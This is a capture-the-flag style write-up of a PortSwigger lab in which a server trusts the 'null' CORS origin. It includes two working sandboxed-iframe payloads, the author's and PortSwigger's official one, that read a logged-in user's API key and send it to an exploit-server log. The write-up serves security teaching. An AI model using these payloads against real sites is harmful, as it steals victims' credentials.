# CORS vulnerability with trusted null origin

**Category:** CORS
**Difficulty:** APPRENTICE
**Lab:** https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

Some CORS implementations try to be more careful than blindly reflecting every origin, and end up
carving out a special case that's worse: explicitly trusting the literal string `null`. It sounds
like a safe default — surely nothing legitimate presents itself as "no origin at all" — except that
an attacker can make their own page produce exactly that value on demand, which is what this lab
demonstrates.

## The Target

The same account page and the same `/accountDetails` AJAX call as the previous lab in this series —
a logged-in user's API key, delivered only over an authenticated XHR request.

## The Investigation

Having already learned this app's CORS handling wasn't a simple static allowlist, the next natural
probe was the `Origin: null` case specifically. Browsers send a literal `null` origin in a handful
of situations that have nothing to do with trust: sandboxed iframes, redirected requests,
`file://` URLs, `data:` URIs, and other serialized contexts all produce it. None of those are
"no attacker," they're just contexts where the browser can't or won't compute a normal origin.

Sending `/accountDetails` with `Origin: null` got back `Access-Control-Allow-Origin: null` and
`Access-Control-Allow-Credentials: true`. The server had, deliberately or not, added `null` to its
list of trusted origins — treating an origin any attacker can trivially generate as if it meant
something.

## The Exploit

The most reliable way to make a browser emit `Origin: null` on an outgoing request is a sandboxed
iframe with just enough permissions to run script and submit requests, but with `allow-same-origin`
withheld — that's what forces the iframe's origin to collapse to `null` in the first place. We put
the same credential-stealing script from the previous lab inside that sandboxed iframe's `srcdoc`:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>var req=new XMLHttpRequest();req.onload=function(){location='https://EXPLOIT-SERVER/log?key='+encodeURIComponent(this.responseText)};req.open('GET','https://TARGET/accountDetails',true);req.withCredentials=true;req.send();</script>"></iframe>
```

The iframe's script runs with `Origin: null`, sends the credentialed request, and because the
target server reflects `null` back in ACAO with credentials allowed, the response is readable. The
same `location` redirect pattern ships the API key out to the exploit server log.

We uploaded this page to the exploit server and delivered it to the victim. Pulling the access log
and URL-decoding it surfaced the `apikey` field in the query string, which we submitted to solve
the lab.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's official solution uses the identical mechanism: confirm `Origin: null` reflects in
ACAO via Repeater, then deliver a sandboxed iframe whose `srcdoc` performs the credentialed XHR:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; </script>"></iframe>
```

This is the same payload structure we used, down to the `encodeURIComponent` call on the stolen
response text — the only difference is a named `reqListener` function versus an inline callback,
which changes nothing about how the exploit behaves. This is a case where the intended solution and
ours converge almost exactly, with the usual delivery difference: PortSwigger's walkthrough builds
and tests this through the exploit server's web UI by hand, while we generated and uploaded the
same HTML through a script.

## What This Teaches Us

Whitelisting `null` treats an ambiguous, attacker-generatable value as if it were a specific,
verifiable origin. It isn't — `null` doesn't identify who's making the request, it just describes a
browser context that has no ordinary origin to report, and a sandboxed iframe is one of several
ways to manufacture that context for free. There's no legitimate reason for a server's CORS policy
to ever grant `null` credentialed access; if a real internal use case seems to require it, that use
case needs a different mechanism entirely, not a hole in the origin allowlist that any external
attacker can walk through with three lines of iframe markup.
